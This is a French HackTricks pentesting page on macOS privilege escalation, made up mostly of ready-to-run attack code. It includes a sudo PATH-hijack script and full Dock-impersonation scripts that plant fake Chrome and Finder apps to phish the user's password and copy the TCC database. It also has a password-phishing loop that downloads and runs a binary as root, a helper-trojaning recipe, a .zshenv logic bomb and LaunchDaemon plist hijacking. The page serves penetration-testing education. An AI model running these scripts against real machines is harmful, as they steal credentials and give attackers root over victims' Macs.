# Élévation de privilèges macOS

{{#include ../../banners/hacktricks-training.md}}

## Élévation de privilèges TCC

Si vous êtes arrivé ici en recherchant une élévation de privilèges TCC, rendez-vous ici :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Veuillez noter que **la plupart des techniques d'élévation de privilèges affectant Linux/Unix affecteront également les machines MacOS**. Consultez donc :


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interaction utilisateur

### Sudo Hijacking

Vous trouverez la technique originale [Sudo Hijacking dans l'article Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **conserve** le **`PATH`** de l'utilisateur lorsqu'il exécute **`sudo`**. Cela signifie qu'une autre façon de réaliser cette attaque serait de **détourner d'autres binaires** que la victime exécutera lorsqu'elle **utilisera sudo :**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Notez qu’un utilisateur qui utilise le terminal aura très probablement **Homebrew installé**. Il est donc possible de détourner des binaires dans **`/opt/homebrew/bin`**.

### Usurpation du Dock

À l’aide de **social engineering**, vous pourriez **usurper par exemple Google Chrome** dans le Dock et exécuter votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez dans le Dock si Chrome y est présent et, le cas échéant, **supprimez** cette entrée, puis **ajoutez** la **fausse** entrée **Chrome à la même position** dans le tableau du Dock.

<details>
<summary>Script d’usurpation de Chrome dans le Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- Vous **ne pouvez pas supprimer Finder du Dock** ; si vous l'ajoutez au Dock, vous pouvez donc placer le faux Finder juste à côté du vrai. Pour cela, vous devez **ajouter l'entrée du faux Finder au début du tableau du Dock**.
- Une autre option consiste à ne pas le placer dans le Dock et à simplement l'ouvrir ; « Finder demande à contrôler Finder » n'est pas si étrange.
- Une autre option pour **escalate to root without asking** le password avec une horrible boîte de dialogue consiste à faire en sorte que Finder demande réellement le password pour effectuer une action privilégiée :
- Demander à Finder de copier dans **`/etc/pam.d`** un nouveau fichier **`sudo`** (la boîte de dialogue demandant le password indiquera que « Finder veut copier sudo »)
- Demander à Finder de copier un nouvel **Authorization Plugin** (vous pouvez contrôler le nom du fichier afin que la boîte de dialogue demandant le password indique que « Finder veut copier Finder.bundle »)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing de demande de mot de passe + réutilisation de sudo

Les malware abusent fréquemment de l'interaction utilisateur pour **capturer un mot de passe permettant d'utiliser sudo** et le réutiliser par programmation. Déroulement courant :

1. Identifier l'utilisateur connecté avec `whoami`.
2. **Répéter les demandes de mot de passe** jusqu'à ce que `dscl . -authonly "$user" "$pw"` renvoie un succès.
3. Mettre en cache l'identifiant (par ex. `/tmp/.pass`) et exécuter des actions privilégiées avec `sudo -S` (mot de passe via stdin).

Exemple de chaîne minimale :
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Le mot de passe volé peut ensuite être réutilisé pour **effacer la quarantine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d'autres fichiers privilégiés, et exécuter des étapes supplémentaires de manière non interactive.<sup>[[1]](#references)</sup>

## Vecteurs spécifiques aux versions récentes de macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` obsolète, mais toujours utilisable

`AuthorizationExecuteWithPrivileges` est obsolète depuis la version 10.7, mais **fonctionne toujours sur Sonoma/Sequoia**. De nombreux updaters commerciaux invoquent `/usr/libexec/security_authtrampoline` avec un chemin non fiable. Si le binaire cible est accessible en écriture par l'utilisateur, vous pouvez y déposer un cheval de Troie et profiter de l'invite légitime :
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combinez avec les **masquerading tricks ci-dessus** pour présenter une boîte de dialogue de mot de passe crédible.


### Triage des privileged helper / XPC

De nombreux privescs tiers modernes sur macOS suivent le même schéma : un **LaunchDaemon root** expose un **service Mach/XPC** depuis **`/Library/PrivilegedHelperTools`**, puis le helper soit **ne valide pas le client**, soit le valide **trop tard** (race PID), soit expose une **méthode root** qui utilise un chemin/script **contrôlé par l'utilisateur**. C'est la classe de vulnérabilités à l'origine de nombreux bugs récents affectant les helpers des clients VPN, des game launchers et des updaters.<sup>[[2]](#references)</sup>

Checklist de triage rapide :
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Accordez une attention particulière aux helpers qui :

- continuent d'accepter des requêtes **après la désinstallation** parce que le job est resté chargé dans `launchd`
- exécutent des scripts ou lisent la configuration depuis **`/Applications/...`** ou d'autres chemins accessibles en écriture par des utilisateurs non-root
- reposent sur une validation du peer basée sur le **PID** ou uniquement sur le **bundle-id**, qui peut être soumise à une race condition

Pour plus de détails sur les bugs d'autorisation des helpers, consultez [cette page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Héritage de l'environnement des scripts PackageKit (CVE-2024-27822)

Jusqu'à ce qu'Apple corrige le problème dans **Sonoma 14.5**, **Ventura 13.6.7** et **Monterey 12.7.5**, les installations lancées par l'utilisateur via **`Installer.app`** / **`PackageKit.framework`** pouvaient exécuter les **scripts PKG en tant que root dans l'environnement de l'utilisateur courant**. Cela signifie qu'un package utilisant **`#!/bin/zsh`** chargeait le **`~/.zshenv`** de l'attaquant et l'exécutait en tant que **root** lorsque la victime installait le package.<sup>[[3]](#references)</sup>

C'est particulièrement intéressant comme **logic bomb** : il suffit d'avoir un foothold dans le compte de l'utilisateur et un fichier de démarrage du shell accessible en écriture, puis d'attendre qu'un installateur vulnérable **basé sur zsh** soit exécuté par l'utilisateur. Cela ne s'applique généralement pas aux déploiements **MDM/Munki**, car ceux-ci s'exécutent dans l'environnement de l'utilisateur root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Si vous souhaitez approfondir les abus spécifiques aux installers, consultez également [cette page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Détournement d’un plist LaunchDaemon (pattern CVE-2025-24085)

Si un plist LaunchDaemon ou sa cible `ProgramArguments` est **modifiable par l’utilisateur**, vous pouvez effectuer une escalation de privilèges en le remplaçant, puis en forçant launchd à le recharger :
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Ce miroir correspond au pattern d’exploitation publié pour **CVE-2025-24085**, où un plist accessible en écriture était exploité pour exécuter du code d’attaquant en tant que root.

### XNU SMR credential race (CVE-2025-24118)

Une **race dans `kauth_cred_proc_update`** permet à un attaquant local de corrompre le pointeur de credentials en lecture seule (`proc_ro.p_ucred`) en exécutant en parallèle des boucles `setgid()`/`getgid()` entre plusieurs threads jusqu’à ce qu’un `memcpy` partiellement écrit se produise. Une corruption réussie donne **uid 0** ainsi qu’un accès à la mémoire du kernel. Structure minimale du PoC :
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Couplez cela à du heap grooming pour placer des données contrôlées à l’endroit où le pointeur est relu. Sur les builds vulnérables, cela permet une **local kernel privesc** fiable sans nécessiter de SIP bypass.<sup>[[4]](#references)</sup>

### SIP bypass via Migration Assistant ("Migraine", CVE-2023-32369)

Si vous avez déjà les privilèges root, SIP bloque toujours les écritures dans les emplacements système. Le bug **Migraine** abuse de l’entitlement de Migration Assistant `com.apple.rootless.install.heritable` pour lancer un processus enfant qui hérite du SIP bypass et écrase des chemins protégés (par exemple, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La chaîne est la suivante :

1. Obtenir les privilèges root sur un système actif.
2. Déclencher `systemmigrationd` avec un état conçu pour exécuter un binaire contrôlé par l’attaquant.
3. Utiliser l’entitlement hérité pour modifier des fichiers protégés par SIP, afin de maintenir la persistance même après un redémarrage.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Plusieurs daemons Apple acceptent des objets **NSPredicate** via XPC et valident uniquement le champ `expressionType`, qui est contrôlé par l’attaquant. En fabriquant un prédicat qui évalue des selectors arbitraires, il est possible d’obtenir une **code execution dans des services XPC root/system** (par exemple, `coreduetd`, `contextstored`). Combiné à un app sandbox escape initial, cela permet une **privilege escalation sans invites utilisateur**. Recherchez les endpoints XPC qui désérialisent des prédicats et n’utilisent pas de visitor robuste.<sup>[[6]](#references)</sup>

## TCC - Escalade de privilèges root

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Tout utilisateur** (même sans privilèges) peut créer et monter un snapshot Time Machine avec `-o noowners` et **accéder à TOUS les fichiers** de ce snapshot, en contournant les vérifications de propriété du volume actif. Le seul privilège nécessaire est que l’application utilisée (comme `Terminal`) dispose de **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Les commandes et l’explication complète se trouvent dans la page TCC bypasses :

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informations sensibles

Cela peut être utile pour escalader les privilèges :


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Références

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
